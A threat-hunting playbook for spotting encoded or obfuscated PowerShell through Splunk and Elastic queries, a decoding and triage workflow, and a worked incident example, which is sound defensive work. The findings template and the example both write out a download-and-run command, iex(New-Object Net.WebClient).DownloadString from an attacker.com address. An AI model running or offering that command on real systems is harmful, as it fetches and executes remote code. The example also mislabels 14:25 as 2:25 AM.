# Threat Hunting Playbook: Encoded PowerShell

## 🎯 Objective

Hunt for encoded or obfuscated PowerShell commands, which are commonly used to evade detection.

## 🔎 Threat Model

### Why Attackers Use Encoding

- **Evade Detection**: Encoded scripts bypass keyword-based detections
- **Obfuscation**: Makes manual analysis harder
- **Delivery**: Email filters often block certain strings
- **Operational Security**: Hide true intent of commands

### Common Encoding Methods

| Method | Indicator | Example |
|--------|-----------|----------|
| Base64 | FromBase64String | `[System.Convert]::FromBase64String(...)` |
| Reverse | Reversed strings | `[string]::join(...[char[]]...)` |
| XOR | Simple XOR cipher | Various implementations |
| Binary | Byte manipulation | `[byte[]]@(...)` |
| Compression | Gzip encoding | `System.IO.Compression` |

## 📊 What Events to Hunt

### Event ID 4104: PowerShell Script Block Execution

**Captured**: Full PowerShell scripts/commands  
**Key Fields**: ScriptBlockText, ScriptBlockId, Path  
**Available**: When PowerShell logging enabled  

## 🔍 Hunting Queries

### Query 1: Find Base64 Encoding Usage

**What It Does**: Finds PowerShell commands using Base64 decoding  
**Why Suspicious**: Common obfuscation technique  
**FP Rate**: Medium (some legitimate use)

#### Splunk SPL

```spl
index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational" 
EventCode=4104
| search ScriptBlockText="*FromBase64String*"
| stats count by user, Computer, ScriptBlockText
| where count > 0
```

#### Elastic KQL

```
event.code:4104 AND powershell.scriptblock_text:*FromBase64String*
```

### Query 2: Find IEX (Invoke-Expression) with Downloaded Content

**What It Does**: Finds commands downloading and executing code  
**Why Suspicious**: Classic malware delivery pattern  
**FP Rate**: Low (rarely used legitimately)  

#### Splunk SPL

```spl
index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational" 
EventCode=4104
| search (ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*")
   AND (ScriptBlockText="*DownloadString*" OR ScriptBlockText="*WebClient*" 
        OR ScriptBlockText="*Invoke-WebRequest*")
| stats count by user, Computer, ScriptBlockText
```

#### Elastic KQL

```
event.code:4104 AND (powershell.scriptblock_text:(*IEX* OR *Invoke-Expression*)) 
  AND (powershell.scriptblock_text:(*DownloadString* OR *WebClient* OR *Invoke-WebRequest*))
```

### Query 3: Find Reverse String Operations (Obfuscation)

**What It Does**: Finds reversed/obfuscated strings  
**Why Suspicious**: Manual obfuscation technique  
**FP Rate**: Low  

#### Splunk SPL

```spl
index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational" 
EventCode=4104
| search ScriptBlockText="*[char[]]" AND ScriptBlockText="*::join"
| stats count by user, Computer
```

### Query 4: Find System.Reflection Usage (DLL Injection)

**What It Does**: Finds reflection-based DLL injection  
**Why Suspicious**: Used for process injection attacks  
**FP Rate**: Low  

#### Splunk SPL

```spl
index=windows source="WinEventLog:Microsoft-Windows-PowerShell/Operational" 
EventCode=4104
| search ScriptBlockText="*System.Reflection*"
| stats count by user, Computer, ScriptBlockText
```

## 📋 Analysis Workflow

### Step 1: Run Hunting Query

1. Execute query in SIEM
2. Review results
3. Count findings
4. Note timeframes

### Step 2: Decode Suspicious Scripts

**For Base64 Encoded Commands**:

```bash
# On Linux/Mac
echo "encoded_string_here" | base64 -d

# On Windows PowerShell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("encoded_string"))
```

### Step 3: Analyze Each Finding

For each suspicious PowerShell script ask:

1. **Is execution legitimate?**
   - Is user admin?
   - Is on expected system?
   - Is during normal work hours?
   - Is script from known publisher?

2. **What does the decoded script do?**
   - Download files?
   - Execute code?
   - Access system resources?
   - Create persistence?

3. **What is the source?**
   - Local file?
   - Network download?
   - Command line?
   - Script file?

4. **Severity Assessment**
   - Definite malware → P1 (Critical)
   - Suspicious pattern → P2 (High)
   - Likely legitimate → P3 (Medium)
   - Definitely legitimate → P4 (Low)

### Step 4: Document Findings

**Template**:

```
Date/Time: 2026-05-18 14:30:00
Computer: WORKSTATION-42
User: jsmith
Event Type: PowerShell Script Block (4104)

Original (Encoded):
[System.Convert]::FromBase64String("aWV4...")

Decoded Script:
iex(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')

Analysis:
- Downloads executable from untrusted source
- Executes without user knowledge (iex)
- Not legitimate PowerShell usage

Severity: P1 (Critical)
Recommendation: Isolate system, investigate compromise
```

## 🔗 Correlation Checks

**After finding suspicious PowerShell, check for**:

1. **Process Execution**
   - What did the script launch?
   - Cmd.exe? Powershell? Other binaries?

2. **Network Activity**
   - Outbound connections after execution?
   - DNS queries to unusual domains?
   - SMB activity?

3. **File Activity**
   - Files created/modified?
   - Downloaded executables?
   - Where stored?

4. **Lateral Movement**
   - Other systems accessed?
   - Admin shares accessed?
   - Services created?

## 💼 Real Example

### Alert: Suspicious PowerShell Encoding Detected

**Time**: 2026-05-18 14:25:00  
**Computer**: WORKSTATION-42  
**User**: jsmith  
**Event**: PowerShell Event ID 4104  

**Original Command**:
```powershell
scriptblock:iex(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

**Hunting Analysis**:

1. ✓ Runs outside normal work hours (2:25 AM)
2. ✓ Downloads from external IP (not company domain)
3. ✓ Executes immediately with IEX
4. ✓ No legitimate business purpose

**Correlation Checks**:
```spl
# Check what happened after this PowerShell
index=windows Computer=WORKSTATION-42 _time>=2026-05-18T14:25:00
| search EventCode=3 OR EventCode=7045 OR EventCode=1
```

Results show:
- ✓ cmd.exe launched from powershell
- ✓ Mimikatz.exe executed
- ✓ LSASS process accessed
- ✓ New service created

**Verdict**: CONFIRMED ATTACK - Initiate IR process

## 🛡️ Remediation

If confirmed attack:

1. **Immediate** (0-30 min)
   - Isolate computer from network
   - Kill suspicious processes
   - Preserve memory dump

2. **Short-term** (1-4 hours)
   - Full system scan for malware
   - Review all user activities
   - Check for lateral movement
   - Reset compromised account passwords

3. **Long-term** (1-7 days)
   - Forensic analysis
   - Check other systems for similar activity
   - Hunt for persistence mechanisms
   - Incident report and lessons learned

---

**Status**: ✅ Production Ready  
**Difficulty**: Intermediate  
**Time**: 30-45 minutes per hunt  
**Last Updated**: 2026-05-18